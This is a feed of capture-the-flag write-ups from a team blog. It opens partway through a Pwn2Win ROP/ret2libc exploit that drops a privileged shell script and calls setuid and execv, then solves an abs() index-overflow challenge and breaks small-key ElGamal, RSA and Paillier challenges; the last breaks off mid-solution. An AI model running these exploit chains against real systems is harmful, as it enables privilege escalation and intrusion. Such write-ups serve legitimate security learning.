<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ cat shell </div><div class="line"><span class="comment">#!/bin/bash -p</span></div><div class="line">/bin/bash -p</div><div class="line">$ cat shell | base64</div><div class="line">IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg==</div></pre></td></tr></table></figure>
<p>Server’s machine</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">'IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg=='</span> | base64 -d</div><div class="line"><span class="comment">#!/bin/bash -p</span></div><div class="line">/bin/bash -p</div><div class="line">$ <span class="built_in">echo</span> <span class="string">'IyEvYmluL2Jhc2ggLXAKL2Jpbi9iYXNoIC1wCg=='</span> | base64 -d &gt; /tmp/exp</div><div class="line">$ chmod +x /tmp/exp</div></pre></td></tr></table></figure>
<p>Now we just need to build a <strong>ropchain</strong> that runs <strong>execv(‘/tmp/exp’, 0x0)</strong> we can’t use something like we use to system we need the address where <strong>/tmp/exp</strong> is stored, the trick here is to put this string on the stack and get it’s address from the register <strong>RSP</strong>, we need to find a gadget like this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MOV RDI, RSP </div><div class="line">CALL RAX</div></pre></td></tr></table></figure>
<p>First we need to store the address from <strong>execv</strong> into <strong>RAX</strong>, and we need to put the string <strong>/tmp/exp</strong> into the stack, so when we <strong>MOV RDI, RSP</strong>,  we are going to move the address of the the string  into <strong>RDI</strong> and then <strong>CALL RAX</strong>. These special gadget is not found in <strong>./wrong</strong> binary we actually needed to search it in the libc binary itself! you can use RopGadgets to do it:</p>
<p>We can build an ropchain that does that like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">MOVCALL_OFFSET = <span class="number">0x12b845</span></div><div class="line">POPRET_OFFSET = <span class="number">0x33544</span></div><div class="line"></div><div class="line">ropchain += p64(LIBCBASE + POPRET_OFFSET) <span class="comment"># POP RAX; RET</span></div><div class="line">ropchain += p64(EXECV) <span class="comment"># "exec"</span></div><div class="line">ropchain += p64(LIBCBASE + MOVCALL_OFFSET) <span class="comment"># MOV RDI, RSP; CALL RAX</span></div><div class="line">ropchain += <span class="string">"/tmp/exp\x00"</span></div></pre></td></tr></table></figure></p>
<p>The full exploit is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./wrong'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc.so.6'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'10.133.70.1'</span>, <span class="number">6666</span>)</div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"></div><div class="line"> </div><div class="line">BINSH_OFFSET = <span class="number">0x18cd17</span> <span class="comment"># strings -a -t x libc.so.6 | grep '/bin/sh'</span></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./wrong'</span>)</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PADDING = <span class="string">'A'</span>*<span class="number">40</span></div><div class="line">POPRET = <span class="number">0x4007f3</span></div><div class="line">POPRET2 = <span class="number">0x4007f1</span></div><div class="line">POPRET3 = <span class="number">0x00000000004007f1</span></div><div class="line"></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>] <span class="comment">#0x000000000040056c</span></div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line">MAIN = <span class="number">0x4006e6</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line"><span class="keyword">print</span> r.recv(len(<span class="string">'Nice to meet you '</span>)+len(PADDING)+<span class="number">3</span>)</div><div class="line"></div><div class="line">PUTS = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Hello! What is your name?\n'</span>)</div><div class="line"></div><div class="line">LIBCBASE = PUTS-libc.symbols[<span class="string">'puts'</span>]</div><div class="line">BINSH = LIBCBASE + BINSH_OFFSET</div><div class="line">EXECV = LIBCBASE + libc.symbols[<span class="string">'execv'</span>]</div><div class="line">SETUID = LIBCBASE + libc.symbols[<span class="string">'setuid'</span>]</div><div class="line">log.info(<span class="string">"LEAKED PUTS LIBC 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"EXECV LIBC 0x%x"</span> % EXECV)</div><div class="line">log.info(<span class="string">"LIBCBASE LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"BINSH ADDRESS 0x%x"</span> % BINSH)</div><div class="line">log.info(<span class="string">"SETUID ADDRESS 0x%x"</span> % SETUID)</div><div class="line"></div><div class="line">MOVCALL_OFFSET = <span class="number">0x12b845</span></div><div class="line">POPRET_OFFSET = <span class="number">0x33544</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line"></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI RET</span></div><div class="line">ropchain += p64(<span class="number">1337</span>) <span class="comment"># 1337 ARG[1]</span></div><div class="line">ropchain += p64(SETUID) <span class="comment"># SETUID function "call"</span></div><div class="line"></div><div class="line">ropchain += p64(LIBCBASE + POPRET_OFFSET) <span class="comment"># POP RAX; RET</span></div><div class="line">ropchain += p64(EXECV) <span class="comment"># "exec"</span></div><div class="line">ropchain += p64(LIBCBASE + MOVCALL_OFFSET) <span class="comment"># MOV RDI RSP; CALL RAX</span></div><div class="line">ropchain += <span class="string">"/tmp/exp\x00"</span> </div><div class="line"></div><div class="line">ropchain += p64(MAIN) <span class="comment"># SYSTEM function "call"</span></div><div class="line"></div><div class="line">r.sendline(PADDING+ropchain)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>Now if we run it we can see we got the <strong>euid</strong> from molly and because of that we can read the <strong>flag.txt</strong> :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$id</span></div><div class="line">uid=1001(wrong-user) gid=1001(wrong-user) euid=1337(molly) groups=1001(wrong-user)</div><div class="line">$ ls /home/molly/flag.txt</div><div class="line">/home/molly/flag.txt</div><div class="line">$ cat /home/molly/flag.txt</div><div class="line">CTF-BR&#123;!!two_steps_pwnage!!&#125;</div></pre></td></tr></table></figure>
<p>I want to thank the organizers of this CTF for letting me getting access to the VPN to finish this challenge.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Wrong User&lt;br&gt;&lt;br&gt;Molly invaded an important system of Bloodsuckers and obtained sensitive information. She believes that yo
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Pwn2Win - Hidden Program (Warmup)</title>
    <link href="https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/"/>
    <id>https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Hidden-Program-Warmup/</id>
    <published>2017-10-22T20:42:32.000Z</published>
    <updated>2017-10-22T20:44:33.928Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Hidden Program (Warmup)<br><br>Molly found this program hidden on her chip, can you help her to understand it?<br><br>Link:<br><a href="https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz" target="_blank" rel="external">https://cloud.ufscar.br:8080/v1/AUTH_c93b694078064b4f81afd2266a502511/static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz</a><br><br>Mirror:<br><a href="https://static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz" target="_blank" rel="external">https://static.pwn2win.party/hiddenprogram_d502a4418484effac415ffb57dfd658b1123dd530fd01714755958bd4b8c1289.tar.gz</a><br><br>Server: nc 200.136.213.126 1988<br><br>Id: hidden_program<br><br>Total solves: 145<br><br>Score: 82<br><br>Categories: Exploitation<br></blockquote>

<p>After extracting we have a .c file:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;limits.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line"></div><div class="line">typedef struct</div><div class="line">&#123;</div><div class="line">    char flag[SHRT_MAX+<span class="number">1</span>];</div><div class="line">    char <span class="keyword">in</span>[SHRT_MAX+<span class="number">1</span>];</div><div class="line">    char sub[SHRT_MAX+<span class="number">1</span>];</div><div class="line">    int n;</div><div class="line">&#125; player;</div><div class="line"></div><div class="line">player p1;</div><div class="line"></div><div class="line">void main()</div><div class="line">&#123;    </div><div class="line">    FILE *fp = fopen(<span class="string">"/home/user/ctf/flag"</span>,<span class="string">"r"</span>);</div><div class="line">    memset(p1.flag,<span class="number">0</span>,sizeof(p1.flag));</div><div class="line">    fscanf(fp,<span class="string">"%[^\n]"</span>,p1.flag);</div><div class="line">    fclose(fp);</div><div class="line">    printf(<span class="string">"%s\n"</span>, p1.<span class="keyword">in</span>);</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        printf(<span class="string">"Insert a short integer: "</span>);</div><div class="line">        fflush(stdout);</div><div class="line">        scanf(<span class="string">" %d"</span>, &amp;p1.n);</div><div class="line">        <span class="keyword">if</span>(p1.n&gt;SHRT_MAX)</div><div class="line">            printf(<span class="string">"Invalid number\n\n"</span>);</div><div class="line">        <span class="keyword">else</span> <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    p1.n = (short)abs((short)p1.n);</div><div class="line">    printf(<span class="string">"Insert a string: "</span>);</div><div class="line">    fflush(stdout);</div><div class="line">    scanf(<span class="string">"%10000s"</span>,p1.<span class="keyword">in</span>);</div><div class="line">    printf(<span class="string">"Insert another string: "</span>);</div><div class="line">    fflush(stdout);</div><div class="line">    scanf(<span class="string">"%10000s"</span>,p1.sub);</div><div class="line">    <span class="keyword">if</span>(strcmp(&amp;p1.<span class="keyword">in</span>[p1.n],p1.sub)==<span class="number">0</span>) printf(<span class="string">"Congratulations!! YOU WIN!!\n"</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        printf(<span class="string">"\tYou lost!!!\n\</span></div><div class="line"><span class="string">        In the string %s the substring in the position %d is %s\n\</span></div><div class="line"><span class="string">        Try again...\n"</span>, p1.<span class="keyword">in</span>, p1.n, &amp;p1.<span class="keyword">in</span>[p1.n]);</div><div class="line">    fflush(stdout);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Resuming what this program is doing, first it opens the flag file from the server and stores it in the c <strong>struct</strong> field <strong>p1.flag</strong>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FILE *fp = fopen(<span class="string">"/home/user/ctf/flag"</span>,<span class="string">"r"</span>);</div><div class="line"><span class="built_in">memset</span>(p1.flag,<span class="number">0</span>,<span class="keyword">sizeof</span>(p1.flag));</div><div class="line"><span class="built_in">fscanf</span>(fp,<span class="string">"%[^\n]"</span>,p1.flag);</div><div class="line">fclose(fp);</div></pre></td></tr></table></figure></p>
<p>Then reads from the <strong>stdin</strong> using <strong>scanf</strong> for a <strong>short int</strong> (stores it in <strong>p1.n</strong>= and two <strong>strings</strong> (stores them in <strong>p1.in</strong> and <strong>p1.sub</strong>). </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Insert a short integer: "</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="built_in">scanf</span>(<span class="string">" %d"</span>, &amp;p1.n);</div><div class="line">  <span class="keyword">if</span>(p1.n&gt;SHRT_MAX)</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Invalid number\n\n"</span>);</div><div class="line">  <span class="keyword">else</span> <span class="keyword">break</span>;</div><div class="line">  &#125;</div><div class="line">p1.n = (<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)p1.n);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Insert a string: "</span>);</div><div class="line">fflush(<span class="built_in">stdout</span>);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%10000s"</span>,p1.in);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Insert another string: "</span>);</div><div class="line">fflush(<span class="built_in">stdout</span>);</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%10000s"</span>,p1.sub);</div></pre></td></tr></table></figure>
<p>In the end we have this check:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(&amp;p1.in[p1.n],p1.sub)==<span class="number">0</span>) </div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Congratulations!! YOU WIN!!\n"</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"\tYou lost!!!\n\</span></div><div class="line"><span class="string">  In the string %s the substring in the position %d is %s\n\</span></div><div class="line"><span class="string">  Try again...\n"</span>, p1.in, p1.n, &amp;p1.in[p1.n]);</div></pre></td></tr></table></figure>
<p>Well the <strong>strcmp</strong> does a compares between <strong>p1.n[p1.n]</strong> character and the string <strong>p1.sub</strong>, if they are equal it prints out the string “Congratulations!! YOU WIN!!\n”, well we can see that making <strong>strcmp</strong> matching this will lead to nothing just a useless string, what we are interested what comes after <strong>else</strong>…</p>
<p>Since we can control the <strong>index</strong> with <strong>p1.n</strong>, we can actually make this <strong>printf</strong> to print the flag which is <strong>p1.flag</strong> we just need to get the offset between <strong>p1.in</strong> and <strong>p1.flag</strong> we can get this easily with <strong>gdb</strong>:</p>
<p>First lets compile the file with <strong>gcc</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ gcc hiddenprogram.c -ggdb -o lol </div><div class="line">hiddenprogram.c: In <span class="keyword">function</span> ‘main’:</div><div class="line">hiddenprogram.c:31:19: warning: implicit declaration of <span class="keyword">function</span> ‘abs’ [-Wimplicit-function-declaration]</div><div class="line">     p1.n = (short)abs((short)p1.n);</div></pre></td></tr></table></figure>
<p>The <strong>–gdb</strong> is very useful gives us alot of debugging information with gdb, we can view where we are located in the source code, breakpoints indicating the line numbers and even print variables by just using its names much easier than looking at assembly and print using addresses right?<br><a data-fancybox="gallery" href="https://i.imgur.com/jNPOgcG.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/jNPOgcG.png" alt=""><br></a><br><a data-fancybox="gallery" href="https://i.imgur.com/dJky7GF.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/dJky7GF.png" alt=""><br></a></p>
<p>After using <strong>gdb</strong> we know where each variable from the <strong>struct</strong> begins doing a simple subtraction we can get the <strong>offset</strong> we need to print the <strong>flag</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x5555557550a0-0x55555575d0a0"</span></div><div class="line"><span class="number">-32768</span></div></pre></td></tr></table></figure>
<p>The real problem in all this is that we need a negative value, and there is a ABS function making us fail:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p1.n = (<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)p1.n);</div></pre></td></tr></table></figure>
<p>For some reason actually after the negative number when &gt;= -32768 the abs won’t do anything (I don’t really know why maybe its because the short cast? but if you know why this happens please tweet me or make a post in the comments)! this is perfect that’s what we really needed, you can see how the <strong>abs</strong> is doing with this program:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">   <span class="keyword">int</span> below=(<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)<span class="number">-32767</span>);</div><div class="line">   <span class="keyword">int</span> value_we_need=(<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)<span class="number">-32768</span>);</div><div class="line">   <span class="keyword">int</span> higher=(<span class="keyword">short</span>)<span class="built_in">abs</span>((<span class="keyword">short</span>)<span class="number">-32769</span>);</div><div class="line">   <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>, below,value_we_need,higher);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gcc wtf.c -o wtf</div><div class="line">wtf.c: In <span class="keyword">function</span> ‘main’:</div><div class="line">wtf.c:4:21: warning: implicit declaration of <span class="keyword">function</span> ‘abs’ [-Wimplicit-function-declaration]</div><div class="line">    int below=(short)abs((short)-32767);</div><div class="line">                     ^~~</div><div class="line">$ ./wtf </div><div class="line">32767 -32768 32767</div></pre></td></tr></table></figure></p>
<p>Now applying this with the service we get the flag by injection <strong>-32768</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">nc 200.136.213.126 1988</div><div class="line">                                 </div><div class="line">Insert a short <span class="built_in">integer</span>: -32768</div><div class="line">Insert a string: 1</div><div class="line">1Insert another string: 1</div><div class="line">	You lost!!!</div><div class="line">        In the string 1 the substring <span class="keyword">in</span> the position -32768 is CTF-BR&#123;Th1s_1S_4_50_5Imp13_C_exp1017_&#125;</div><div class="line">        Try again...</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Hidden Program (Warmup)&lt;br&gt;&lt;br&gt;Molly found this program hidden on her chip, can you help her to understand it?&lt;br&gt;&lt;br&gt;Link:&lt;
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="index" scheme="https://teamrocketist.github.io/tags/index/"/>
    
      <category term="pwn2winctf" scheme="https://teamrocketist.github.io/tags/pwn2winctf/"/>
    
  </entry>
  
  <entry>
    <title>Crypto-Pwn2Win-2017-Asymmetric-Encryption</title>
    <link href="https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/"/>
    <id>https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Asymmetric-Encryption/</id>
    <published>2017-10-22T20:07:58.000Z</published>
    <updated>2017-10-22T21:11:31.702Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Asymmetric Encryption<br>Bloodsuckers use different asymmetric encryption algorithms to send messages to their partners. You may be able to exploit such communications, but first you should be able to recognize the used asymmetric algorithms.<br><br>Server: nc 200.136.213.110 7777<br><br></blockquote>

<p>We fire netcat and we obtain the following:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">q = 896922063827</div><div class="line">g = 12424931089</div><div class="line">h = 574559267769</div><div class="line">enc(a) = (453104394915, 390471080026)</div><div class="line">enc(3*a + 32)?</div></pre></td></tr></table></figure>
<p>We notice that the cryptosystem here must be ElGamal.<br>One can obtain the encryption of 3<em>a, because ElGamal is homomorphic in relation to the multiplication, i.e. E(m1)</em>E(m2) = E(m1*m2). But, it is not in relation to the addition. Therefore, it is required to find the private key x such that g^x mod q = h. As the prime q only has 40 bits, it is easy to find out with the baby step giant step meet in the middle attack.<br>We used <a href="https://github.com/viralpoetry/Baby-step-giant-step" target="_blank" rel="external">https://github.com/viralpoetry/Baby-step-giant-step</a> to compute the discrete log. We obtain x = 202922528794.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">202922528794</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>q = <span class="number">896922063827</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>h = <span class="number">574559267769</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>g = <span class="number">12424931089</span></div><div class="line"><span class="comment"># we have now to find a</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>enc = (<span class="number">453104394915</span>, <span class="number">390471080026</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = pow(enc[<span class="number">0</span>], x, q)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sinv = modinv(s, q)</div><div class="line"><span class="comment"># (modinv from https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python)</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = enc[<span class="number">1</span>] * sinv % q</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line"><span class="number">108768066438L</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>to_encrypt = <span class="number">3</span>*a + <span class="number">32</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="number">5</span>   <span class="comment"># we chose a small random number for the encryption. it could be whatever you wanted &lt; q</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>result = (pow(g, r, q), to_encrypt * pow(h, r, q) % q)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>result</div><div class="line">(<span class="number">801172058328L</span>, <span class="number">410122112192L</span>)</div></pre></td></tr></table></figure>
<p>Easy. We have our first correct answer.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">q = 896922063827</div><div class="line">g = 12424931089</div><div class="line">h = 574559267769</div><div class="line">enc(a) = (453104394915, 390471080026)</div><div class="line">enc(3*a + 32)?</div><div class="line">(801172058328, 410122112192)</div><div class="line">Correct! Next...</div><div class="line">n = 659381354716006369742363</div><div class="line">e = 65537</div><div class="line">enc(a) = 554863447144015806910906</div><div class="line">enc(a^5 + 2*a + 41)?</div></pre></td></tr></table></figure>
<p>Now, this is clearly RSA. The modulus is small. Let’s use yafu to compute the factors of 659381354716006369742363.<br>We obtain p = 864367132729 and q = 762848712947. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; p = 864367132729</div><div class="line">&gt;&gt;&gt; q = 762848712947</div><div class="line">&gt;&gt;&gt; n = p * q</div><div class="line">&gt;&gt;&gt; e = 65537</div><div class="line">&gt;&gt;&gt; d = modinv(e, (p-1)*(q-1))</div><div class="line">&gt;&gt;&gt; a = pow(554863447144015806910906, d, n)</div><div class="line">&gt;&gt;&gt; a</div><div class="line">218624962707346537869456L</div><div class="line">&gt;&gt;&gt; pow(a**5 + 2*a + 41, e, n)</div><div class="line">215275919603710085695724L</div></pre></td></tr></table></figure>
<p>We have our second answer correct.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">n = 659381354716006369742363</div><div class="line">e = 65537</div><div class="line">enc(a) = 554863447144015806910906</div><div class="line">enc(a^5 + 2*a + 41)?</div><div class="line">215275919603710085695724</div><div class="line">Correct! Next...</div><div class="line">n = 776738987646974637425039</div><div class="line">g = 776738987646974637425040</div><div class="line">enc(a) = 104466234975614190334351556746005105225005455760</div><div class="line">enc(a^5)?</div></pre></td></tr></table></figure>
<p>Now, this looks like Paillier cryptosystem. We used yafu to discover n = p * q. We obtain p = 952658582963 and q = 815338256053.</p>
